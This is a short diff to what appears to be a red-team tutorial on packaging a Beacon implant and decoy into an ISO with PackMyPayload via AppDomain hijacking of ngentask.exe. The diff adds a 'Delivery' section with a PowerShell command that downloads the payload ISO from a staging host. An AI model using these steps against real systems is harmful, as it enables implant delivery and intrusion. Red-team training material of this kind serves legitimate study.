@@ -363,3 +363,9 @@ python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H ngentask.exe,AppDomainHij
 
 1. Double-click on the ISO to mount it and you should only see the trigger.
 2. Double-click on the trigger a final time, and the decoy and Beacon should appear.
+
+# Delivery
+
+```
+iwr -uri http://10.0.0.5:80/deals.iso -Outfile deals.iso
+```
